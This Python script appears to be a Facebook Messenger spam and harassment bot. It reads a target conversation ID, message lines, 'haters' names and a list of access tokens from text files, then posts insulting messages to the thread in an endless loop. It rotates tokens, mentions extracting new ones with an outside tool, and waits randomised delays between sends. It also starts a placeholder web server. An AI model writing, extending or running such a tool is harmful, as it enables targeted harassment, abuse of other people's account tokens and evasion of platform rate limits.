import requests
import json
import time
import random
import threading
import http.server
import socketserver
import sys

# Typewriter Effect
def type_effect(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.02)
    print()

# Simple HTTP Server
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"-- THIS SERVER MADE BY RAJKUMAR")

def execute_server():
    PORT = 4000
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()

# Function to get a new token if old one is invalid
def get_new_token():
    new_token = "EAAB..."  # Vinthool se extract hone wala token (replace karo actual method se)
    return new_token

# Read random delay times from time.txt
def get_random_delay():
    with open('time.txt', 'r') as file:
        times = [int(line.split('.')[1].strip()) for line in file.readlines()]
    return random.choice(times)

# Read last names from lastname.txt
def get_random_lastname():
    with open('lastname.txt', 'r') as file:
        lastnames = file.readlines()
    return random.choice(lastnames).strip()

# Read haters names from hatersname.txt
def get_random_hatersname():
    with open('hatersname.txt', 'r') as file:
        haters = file.readlines()
    return random.choice(haters).strip()

# Send Messages from File
def send_messages_from_file():
    with open('convo.txt', 'r') as file:
        convo_id = file.read().strip()

    with open('File.txt', 'r') as file:
        messages = file.readlines()

    num_messages = len(messages)

    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()
    num_tokens = len(tokens)

    max_tokens = min(num_tokens, num_messages)

    while True:
        try:
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()

                if not access_token.startswith("EAAB"):  # Token Expired Check
                    access_token = get_new_token()  # Auto-extract new token

                message = messages[message_index].strip()
                lastname = get_random_lastname()
                hatersname = get_random_hatersname()
                delay_time = get_random_delay()

                url = f"https://graph.facebook.com/v22.0/t_{convo_id}/"
                parameters = {'access_token': access_token, 'message': f"{hatersname} {message} {lastname}"}
                response = requests.post(url, json=parameters)

                if response.ok:
                    type_effect(f"\033[1;92m[+] Message Sent: {hatersname} {message} {lastname}")
                else:
                    print(f"\033[1;91m[x] Failed to send: {hatersname} {message} {lastname}")

                time.sleep(delay_time)  # Randomized delay from time.txt

        except Exception as e:
            print(f"[!] Error: {e}")

def main():
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()

    send_messages_from_file()

if __name__ == '__main__':
    main()
